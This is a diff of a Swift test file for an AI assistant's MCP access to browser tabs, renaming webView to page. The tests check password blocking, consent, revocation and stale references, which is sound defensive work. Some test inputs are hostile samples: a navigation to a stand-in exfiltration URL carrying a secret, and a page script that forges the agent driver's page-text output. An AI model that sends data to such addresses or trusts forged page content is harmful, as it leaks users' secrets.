@@ -28,7 +28,7 @@ struct MCPPrivacyTests {
         let browser = BrowserModel(database: .temporary(), sitePermissions: SitePermissions(storageURL: nil))
         let url = try server.url()
         let tab = browser.newTab(url: url)
-        #expect(await PageSettle.untilIdle(tab.webView))
+        #expect(await PageSettle.untilIdle(tab.page))
         tab.assistantAccess.persistsAnswers = false
         tab.assistantAccess.pageChanged(url: url)
         return (server, browser, tab)
@@ -81,7 +81,7 @@ struct MCPPrivacyTests {
         #expect(next != first)
         let second = try await call(subject, "clickOnPage", tab: tab, arguments: ["observationID": .string(next), "ref": 3])
         #expect(second.isError == false, "\(text(second))")
-        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.clicked") as? String == "yes")
+        #expect(try await tab.page.evaluateJavaScript("document.body.dataset.clicked") as? String == "yes")
         #expect(try await call(subject, "clickOnPage", tab: tab, arguments: ["observationID": .string(first), "ref": 3]).isError == true)
     }
 
@@ -114,7 +114,7 @@ struct MCPPrivacyTests {
         #expect(action.isError == true)
         #expect(text(action).contains("Filled 1 of 2"))
         #expect(!text(action).contains("hidden-secret"))
-        #expect(try await tab.webView.evaluateJavaScript("document.querySelector('[type=password]').value") as? String == "hidden-secret")
+        #expect(try await tab.page.evaluateJavaScript("document.querySelector('[type=password]').value") as? String == "hidden-secret")
     }
 
     @Test func connectingDoesNotRevealOrControlTabs() async throws {
@@ -213,7 +213,7 @@ struct MCPPrivacyTests {
         defer { _ = server }
         let subject = MCPBrowserSession(browser: browser, available: { true }, consent: { _, _ in
             tab.loadHTML("<p>Replacement secret</p>", baseURL: URL(string: "https://replacement.invalid/"))
-            _ = await waitUntil { tab.webView.url?.host() == "replacement.invalid" }
+            _ = await waitUntil { tab.page.url?.host() == "replacement.invalid" }
             return .control
         })
         let shared = try await call(subject, "requestAccess")
@@ -234,7 +234,7 @@ struct MCPPrivacyTests {
         let id = try await observation(first, tab: tab)
         let wrong = try await call(second, "clickOnPage", tab: tab, arguments: ["observationID": .string(id), "ref": 3])
         #expect(wrong.isError == true)
-        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.clicked || ''") as? String == "")
+        #expect(try await tab.page.evaluateJavaScript("document.body.dataset.clicked || ''") as? String == "")
     }
 
     @Test func anotherReadInvalidatesControlReferences() async throws {
@@ -248,7 +248,7 @@ struct MCPPrivacyTests {
         _ = try await observation(second, tab: tab)
         let result = try await call(first, "clickOnPage", tab: tab, arguments: ["observationID": .string(stale), "ref": 3])
         #expect(result.isError == true)
-        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.clicked || ''") as? String == "")
+        #expect(try await tab.page.evaluateJavaScript("document.body.dataset.clicked || ''") as? String == "")
     }
 
     @Test func typingWorksButPasswordFieldsStayBlocked() async throws {
@@ -261,13 +261,13 @@ struct MCPPrivacyTests {
             "observationID": .string(normal), "ref": 1, "text": "hello",
         ])
         #expect(typed.isError == false, "\(text(typed))")
-        #expect(try await tab.webView.evaluateJavaScript("document.querySelector('input').value") as? String == "hello")
+        #expect(try await tab.page.evaluateJavaScript("document.querySelector('input').value") as? String == "hello")
         let password = try await observation(subject, tab: tab)
         let refused = try await call(subject, "typeOnPage", tab: tab, arguments: [
             "observationID": .string(password), "ref": 2, "text": "replacement",
         ])
         #expect(refused.isError == true)
-        #expect(try await tab.webView.evaluateJavaScript("document.querySelector('[type=password]').value") as? String == "hidden-secret")
+        #expect(try await tab.page.evaluateJavaScript("document.querySelector('[type=password]').value") as? String == "hidden-secret")
     }
 
     @Test func revokingDuringTheActionPausePreventsTheClick() async throws {
@@ -282,7 +282,7 @@ struct MCPPrivacyTests {
             try await call(subject, "clickOnPage", tab: tab, arguments: ["observationID": .string(id), "ref": 3])
         }
         #expect(result.isError == true)
-        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.clicked || ''") as? String == "")
+        #expect(try await tab.page.evaluateJavaScript("document.body.dataset.clicked || ''") as? String == "")
     }
 
     @Test func consequentialActionsDoNotInheritAssistantApprovals() async throws {
@@ -292,7 +292,7 @@ struct MCPPrivacyTests {
         _ = try await call(subject, "requestAccess")
         let id = try await observation(subject, tab: tab)
         let inherited = AgentActionPolicy(storage: MCPActionGrantStorage())
-        inherited.allowAlways(.publication, host: tab.webView.url?.host())
+        inherited.allowAlways(.publication, host: tab.page.url?.host())
         var asked = false
         let result = try await AgentActionConsent.$scopedPolicy.withValue(inherited) {
             try await AgentActionConsent.$decisionForTesting.withValue(.init { _, _, _ in
@@ -304,7 +304,7 @@ struct MCPPrivacyTests {
         }
         #expect(asked)
         #expect(result.isError == true)
-        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.published || ''") as? String == "")
+        #expect(try await tab.page.evaluateJavaScript("document.body.dataset.published || ''") as? String == "")
     }
 
     @Test func pageContentCannotSupplyAnUnobservedOutboundAddress() async throws {
@@ -315,7 +315,7 @@ struct MCPPrivacyTests {
         _ = try await observation(subject, tab: tab)
         let result = try await call(subject, "navigate", tab: tab, arguments: ["url": "https://exfiltration.invalid/?secret=value"])
         #expect(result.isError == true)
-        #expect(tab.webView.url == (try server.url()))
+        #expect(tab.page.url == (try server.url()))
     }
 
     @Test func observedNavigationWorksInTheSharedTab() async throws {
@@ -359,7 +359,7 @@ struct MCPPrivacyTests {
     @Test func pageWorldScriptsCannotReplaceTheExternalDriver() async throws {
         let (server, browser, tab) = try await fixture()
         defer { _ = server }
-        _ = try await tab.webView.evaluateJavaScript("window.__wsurf = { pageText: () => 'forged-content', collect: () => [] };")
+        _ = try await tab.page.evaluateJavaScript("window.__wsurf = { pageText: () => 'forged-content', collect: () => [] };")
         let subject = session(browser)
         _ = try await call(subject, "requestAccess")
         let read = try await call(subject, "readPage", tab: tab)
